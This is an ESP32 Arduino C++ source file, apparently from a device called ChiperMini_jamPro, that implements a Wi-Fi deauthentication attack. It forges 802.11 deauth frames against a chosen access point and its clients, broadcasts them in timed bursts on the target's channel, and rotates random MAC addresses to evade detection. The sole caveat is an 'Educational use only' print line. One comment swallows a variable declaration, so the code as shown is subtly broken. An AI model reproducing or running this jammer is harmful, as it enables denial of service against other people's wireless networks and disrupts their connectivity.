// File: src/wifi_module.cpp
// ChiperMini_jamPro - WiFi Attack Module
// FIXED: Channel switching, MAC rotation timing, proper init

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include "config.h"

extern bool attackActive;
extern String targetBSSID;
extern uint8_t targetChannel;
extern unsigned long attackStart;

// ======== 802.11 DEAUTH FRAME ========
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  da[6];
    uint8_t  sa[6];
    uint8_t  bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason;
} __attribute__((packed)) deauth_frame_t;

// ======== MAC ROTATION STATE ========
uint8_t current_mac[6];
unsigned long lastMacRotation = 0;
uint16_t packetsSentThisMac = 0;
uint16_t seq_counter = 0;

// ======== RANDOM MAC GENERATION ========
void generate_random_mac(uint8_t* mac) {
    uint32_t r1 = esp_random();
    uint32_t r2 = esp_random();
    
    mac[0] = 0x02;  // Local bit = 1
    mac[1] = r1 & 0xFF;
    mac[2] = (r1 >> 8) & 0xFF;
    mac[3] = (r1 >> 16) & 0xFF;
    mac[4] = (r1 >> 24) & 0xFF;
    mac[5] = r2 & 0xFF;
    
    mac[0] |= 0x02;   // Ensure local
    mac[0] &= ~0x01;  // Unicast
}

void rotate_mac_if_needed() {
    // Меняем MAC если: прошло 3 секунды ИЛИ отправлено 15 пакетов    bool timeExpired = (millis() - lastMacRotation >= MAC_ROTATION_INTERVAL_MS);
    bool packetLimit = (packetsSentThisMac >= PACKETS_PER_MAC);
    
    if (timeExpired || packetLimit) {
        generate_random_mac(current_mac);
        
        // Правильная последовательность смены MAC
        esp_wifi_set_promiscuous(false);
        delay(MAC_CHANGE_DELAY_MS);  // Ждём 2мс для стабильности
        esp_err_t err = esp_wifi_set_mac(WIFI_IF_STA, current_mac);
        if (err != ESP_OK) {
            Serial.printf("[MAC] Set failed: %d\n", err);
        }
        delay(MAC_CHANGE_DELAY_MS);
        esp_wifi_set_promiscuous(true);
        
        lastMacRotation = millis();
        packetsSentThisMac = 0;
        
        Serial.println("[MAC] Rotated");
    }
}

// ======== SEND SINGLE DEAUTH PACKET ========
void send_deauth_packet(const uint8_t* bssid, const uint8_t* target) {
    // Проверяем, нужно ли ротировать MAC
    rotate_mac_if_needed();
    
    // Формируем пакет
    deauth_frame_t frame;
    frame.frame_control = 0xC000;  // Deauth frame
    frame.duration = 0;
    
    // Destination
    if (target == nullptr) {
        memset(frame.da, 0xFF, 6);  // Broadcast
    } else {
        memcpy(frame.da, target, 6);
    }
    
    // Source = текущий рандомный MAC
    memcpy(frame.sa, current_mac, 6);
    
    // BSSID = целевой AP
    memcpy(frame.bssid, bssid, 6);
    
    // Sequence control (инкремент для валидности)
    frame.seq_ctrl = (seq_counter++ << 4) & 0xFFF0;
    frame.reason = DEAUTH_REASON;
        // Отправляем пакет
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(deauth_frame_t), false);
    if (err != ESP_OK) {
        Serial.printf("[TX] Error: %d\n", err);
    }
    
    // Задержка для стабильности радио
    delayMicroseconds(TX_DELAY_US);
    
    // Считаем пакеты для ротации
    packetsSentThisMac++;
}

// ======== DEAUTH BURST ========
void send_deauth_burst(const uint8_t* bssid) {
    // Пакет 1: всем клиентам (broadcast DA)
    send_deauth_packet(bssid, nullptr);
    
    // Пакет 2: самому AP (DA = BSSID)
    send_deauth_packet(bssid, bssid);
    
    Serial.printf("[DEAUTH] Burst sent to %02X:%02X:%02X:%02X:%02X:%02X\n",
                  bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

// ======== PUBLIC FUNCTIONS ========
void wifi_scan_start() {
    WiFi.scanNetworks(true);  // Async scan
    Serial.println("[SCAN] Started");
}

void wifi_deauth_start(const String& bssid_str, uint8_t channel) {
    Serial.printf("[DEAUTH] Starting attack on %s (channel %d)\n", bssid_str.c_str(), channel);
    
    // Парсим BSSID
    uint8_t bssid[6];
    sscanf(bssid_str.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
    
    // ✅ КРИТИЧЕСКИ ВАЖНО: Правильная инициализация для атаки
    // 1. Останавливаем текущий WiFi
    esp_wifi_stop();
    delay(50);
    
    // 2. Переключаем в STA режим
    WiFi.mode(WIFI_MODE_STA);
    
    // 3. Запускаем WiFi стек
    esp_err_t err = esp_wifi_start();
    if (err != ESP_OK) {        Serial.printf("[ERROR] esp_wifi_start failed: %d\n", err);
        return;
    }
    delay(100);  // Даём время на инициализацию
    
    // 4. ✅ Устанавливаем канал ЦЕЛИ (критично!)
    err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        Serial.printf("[ERROR] esp_wifi_set_channel failed: %d\n", err);
    } else {
        Serial.printf("[DEAUTH] Set channel %d\n", channel);
    }
    
    // 5. Генерируем стартовый MAC
    generate_random_mac(current_mac);
    
    // 6. Устанавливаем стартовый MAC (ДО promiscuous!)
    esp_wifi_set_promiscuous(false);
    delay(2);
    esp_wifi_set_mac(WIFI_IF_STA, current_mac);
    
    // 7. Настраиваем promiscuous фильтр
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | 
                       WIFI_PROMIS_FILTER_MASK_MGMT |
                       WIFI_PROMIS_FILTER_MASK_CTRL
    };
    esp_wifi_set_promiscuous_filter(&filter);
    
    // 8. Освобождаем буфер приёма (для стабильности tx)
    esp_wifi_set_promiscuous_rx_cb(NULL);
    
    // 9. Включаем promiscuous режим
    esp_wifi_set_promiscuous(true);
    
    // 10. Инициализируем состояние ротации
    lastMacRotation = millis();
    packetsSentThisMac = 0;
    seq_counter = 0;
    
    // Запускаем атаку
    attackActive = true;
    targetBSSID = bssid_str;
    targetChannel = channel;
    attackStart = millis();
    
    Serial.println("[DEAUTH] Attack started with MAC rotation every 3s");
    Serial.println("[LEGAL] Educational use only");
}
void wifi_deauth_stop() {
    if (!attackActive) return;
    
    attackActive = false;
    
    // Выключаем promiscuous
    esp_wifi_set_promiscuous(false);
    
    // Возвращаем в режим выключения
    esp_wifi_stop();
    WiFi.mode(WIFI_OFF);
    
    Serial.println("[DEAUTH] Stopped. WiFi powered down.");
}

void wifi_deauth_loop() {
    if (!attackActive || targetBSSID.isEmpty()) return;
    
    static unsigned long lastBurst = 0;
    
    if (millis() - lastBurst >= DEAUTH_INTERVAL_MS) {
        uint8_t bssid[6];
        sscanf(targetBSSID.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);
        
        send_deauth_burst(bssid);
        lastBurst = millis();
    }
    
    yield();  // RTOS stability
}
